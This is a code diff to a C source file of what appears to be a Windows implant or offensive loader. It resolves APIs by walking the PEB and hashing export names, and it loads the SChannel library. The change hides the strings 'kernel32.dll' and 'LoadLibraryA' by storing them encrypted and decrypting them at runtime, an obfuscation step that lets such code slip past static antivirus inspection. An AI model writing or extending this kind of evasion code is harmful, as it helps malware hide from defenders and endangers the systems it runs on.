@@ -12,6 +12,7 @@
 #include "peb.h"
 #include "export_resolve.h"
 #include "hash.h"
+#include "enc_strings.h"
 
 /* ── SChannel constants (guard against mingw redefines) ─────────── */
 
@@ -123,11 +124,13 @@ static int sec_ensure_loaded(void) {
     /* Fallback: load via encrypted string */
     if (!g_secur32) {
         typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
-        uint32_t k32_hash = mirage_encrypted_hash_module("kernel32.dll");
+        char k32_dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, k32_dll);
+        uint32_t k32_hash = mirage_encrypted_hash_module(k32_dll);
         void* k32 = mirage_get_module_by_hash(k32_hash);
         if (!k32) return 0;
+        char ll_fn[32]; enc_decrypt(enc_LoadLibraryA, ENC_LOADLIBRARYA_LEN, ll_fn);
         pLoadLibraryA fnLoad = (pLoadLibraryA)resolve_fn(k32,
-            mirage_encrypted_hash_func("LoadLibraryA"));
+            mirage_encrypted_hash_func(ll_fn));
         if (!fnLoad) return 0;
         g_secur32 = fnLoad((const char*)tmp);
         if (!g_secur32) return 0;
